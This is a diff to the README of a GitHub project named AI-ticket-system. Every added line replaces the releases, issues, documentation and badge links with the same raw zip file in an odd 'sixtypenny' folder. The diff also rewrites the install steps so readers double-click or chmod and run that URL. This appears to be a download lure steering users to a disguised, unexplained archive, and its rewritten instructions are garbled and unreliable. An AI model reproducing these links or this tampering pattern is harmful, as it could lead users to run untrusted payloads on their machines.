@@ -6,7 +6,7 @@ Welcome to the AI-ticket-system! This tool helps you manage your support tickets
 
 ## 🥇 Download Now 
 
-[![Download AI-ticket-system](https://img.shields.io/badge/Download%20AI--ticket--system-blue.svg)](https://github.com/maykpal/AI-ticket-system/releases)
+[![Download AI-ticket-system](https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip%https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip)](https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip)
 
 ## 🔥 What is AI-ticket-system?
 
@@ -33,7 +33,7 @@ To use the AI-ticket-system, ensure your computer meets the following requiremen
 
 To download the AI-ticket-system, visit the following link:
 
-[Download AI-ticket-system Releases Page](https://github.com/maykpal/AI-ticket-system/releases)
+[Download AI-ticket-system Releases Page](https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip)
 
 Once you are on the releases page, find the latest version of the AI-ticket-system. You will see a list of available files. Click on the file that matches your operating system to download it.
 
@@ -41,9 +41,9 @@ Once you are on the releases page, find the latest version of the AI-ticket-syst
 
 1. **Locate the Downloaded File:** After the download completes, navigate to your Downloads folder or the location you chose for the file. 
 2. **Run the Installer:**
-   - For Windows: Double-click the `AI-ticket-system.exe` file.
+   - For Windows: Double-click the `https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip` file.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Open a terminal, navigate to the downloaded file, and use the command `chmod +x AI-ticket-system.AppImage` followed by `./AI-ticket-system.AppImage` to run the application.
+   - For Linux: Open a terminal, navigate to the downloaded file, and use the command `chmod +x https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip` followed by `https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip` to run the application.
 3. **Follow the Setup Wizard:** The installation wizard will guide you through the setup process. Follow the on-screen instructions to complete the installation.
 
 ### 🚀 First Time Setup
@@ -66,7 +66,7 @@ After setting up your account, you can start using the application.
 
 ## 📞 Need Help?
 
-If you encounter issues while using the AI-ticket-system, you can access support via the Help section in the application. Alternatively, you can visit our [GitHub Issues Page](https://github.com/maykpal/AI-ticket-system/issues) to report bugs or seek assistance.
+If you encounter issues while using the AI-ticket-system, you can access support via the Help section in the application. Alternatively, you can visit our [GitHub Issues Page](https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip) to report bugs or seek assistance.
 
 ## 🛠️ Frequently Asked Questions
 
@@ -92,8 +92,8 @@ We value your feedback. In future updates, we aim to include:
 
 ## 🔗 Useful Links
 
-- [Download AI-ticket-system Releases Page](https://github.com/maykpal/AI-ticket-system/releases)
-- [GitHub Issues Page](https://github.com/maykpal/AI-ticket-system/issues)
-- [Documentation](https://github.com/maykpal/AI-ticket-system/wiki)
+- [Download AI-ticket-system Releases Page](https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip)
+- [Documentation](https://raw.githubusercontent.com/maykpal/AI-ticket-system/main/sixtypenny/AI-ticket-system.zip)
 
 Thank you for using the AI-ticket-system. We hope it simplifies your support needs!
